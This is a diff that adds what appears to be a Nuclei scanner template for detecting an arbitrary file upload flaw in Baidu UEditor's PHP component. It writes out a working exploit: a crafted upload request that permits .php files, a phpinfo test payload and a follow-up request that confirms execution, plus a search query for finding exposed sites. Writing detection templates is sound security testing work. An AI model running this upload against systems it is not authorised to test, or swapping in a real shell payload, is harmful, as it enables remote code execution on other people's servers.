@@ -1,0 +1,70 @@
+id: ueditor-arbitrary-file-upload
+
+info:
+  name: UEditor - PHP Arbitrary File Upload
+  author: ChiragArtani
+  severity: medium
+  description: |
+    Detects arbitrary file upload vulnerability in UEditor PHP  by attempting to upload and execute a PHP file. This vulnerability allows remote attackers to upload arbitrary files including PHP files, potentially leading to remote code execution.
+  reference:
+    - https://www.rescuetime.com/focus/url/https%3A%2F%2Fwww.cnblogs.com%2Fzhibing%2Fp%2F16893839.html%23_4
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
+    cvss-score: 6.1
+    cwe-id: CWE-434
+    cpe: cpe:2.3:a:baidu:ueditor:*:*:*:*:*:*:*:*
+  metadata:
+    max-request: 2
+    fofa-query: body="ueditor"
+    vendor: baidu
+    product: ueditor
+  tags: ueditor,file-upload,rce,intrusive,vuln
+
+variables:
+  filename: "{{rand_base(5)}}"
+
+http:
+  - raw:
+      - |
+        POST /php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=ueditor/php/upload/{{filename}}&CONFIG[imageMaxSize]=9999999&CONFIG[imageAllowFiles][]=.php&CONFIG[imageFieldName]={{filename}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryDMmqvK6b3ncX4xxA
+
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA
+        Content-Disposition: form-data; name="{{filename}}"; filename="{{filename}}.php"
+        Content-Type: application/octet-stream
+
+        <?php
+        phpinfo();
+        ?>
+        ------WebKitFormBoundaryDMmqvK6b3ncX4xxA--
+
+      - |
+        GET /php/upload/{{filename}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - "PHP Extension"
+          - "PHP Version"
+        condition: and
+
+      - type: status
+        status:
+          - 200
+
+    extractors:
+      - type: regex
+        name: vuln_path
+        regex:
+          - "/ueditor/php/upload/{{filename}}\\.php"
+
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '>PHP Version <\/td><td class="v">([0-9.]+)'
+# digest: 4a0a00473045022100957f056cb661fda24bbbb369b8273a20f1feab9e6c5bc68903e6a7a2ea5c864e02202b23f605d558fd3f392b81af9c1324c813405983bf6b9efdc0e9e9165c475e4a:922c64590222798bb761d5b6d8e72950
